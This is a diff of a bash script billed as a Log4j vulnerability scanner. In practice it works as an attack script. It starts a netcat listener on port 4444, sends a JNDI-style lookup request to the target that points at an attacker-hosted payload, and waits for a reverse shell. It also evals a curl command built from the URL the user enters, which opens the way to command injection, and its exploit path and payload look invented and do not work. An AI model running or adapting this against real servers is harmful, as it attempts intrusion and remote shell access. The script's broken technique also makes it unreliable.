@@ -3,21 +3,37 @@
 echo "Vulnerability Scanner for Log4j"
 echo "Checking if the server is vulnerable..."
 
-read -p "Enter the URL of the website: " url
+# Prompt user for a URL
+read -p "Enter the URL: " url
 
-# Extract the server type and the server's IP address and port
+# Use curl to retrieve the server type from the HTTP response headers
+server_type_header=$(curl -sI "$url" | grep -i "Server:" | awk '{print $2}')
+
+# Use curl to retrieve the HTML content and check for common server identifiers
+server_type_html=$(curl -sL "$url" | grep -iE "<meta[^>]*server[^>]*>" | sed -n 's/.*content="\([^"]*\)".*/\1/p')
+
+# Display the detected server type
+if [ -n "$server_type_header" ]; then
+    serverType="$server_type_header"
+    echo "Server Type (from header): $serverType"
+elif [ -n "$server_type_html" ]; then
+    serverType="$server_type_html"
+    echo "Server Type (from HTML): $serverType"
+else
+    echo "Server type not detected. Exiting."
+    exit 1
+fi
+
+# Extract the server's IP address and port from the URL
 if [[ "$url" == "http://"* ]]; then
-    serverType="Apache"
     ipAddressAndPort=${url:7}
 elif [[ "$url" == "https://"* ]]; then
-    serverType="Nginx"
     ipAddressAndPort=${url:8}
 else
     echo "Invalid URL. Please try again."
     exit 1
 fi
 
-echo "Server type: $serverType"
 echo "IP address and port: $ipAddressAndPort"
 
 # Check if Log4j is present on the target server
@@ -46,11 +62,9 @@ nc -l -p 4444 > output.txt &
 # Generate a payload file for Log4j vulnerability
 echo "Greeting from Log4j!" > payload.txt
 
-if [ "$serverType" == "Apache" ]; then
-    curl "http://$ipAddressAndPort/jndi-manager/lookup?name=$publicUrl/payload.txt" > /dev/null 2>&1
-else
-    curl "https://$ipAddressAndPort/jndi-manager/lookup?name=$publicUrl/payload.txt" > /dev/null 2>&1
-fi
+curl_command="curl \"$url/jndi-manager/lookup?name=$publicUrl/payload.txt\" > /dev/null 2>&1"
+eval $curl_command
+
 
 # Wait for the reverse shell to establish
 echo "Waiting for the reverse shell to establish..."
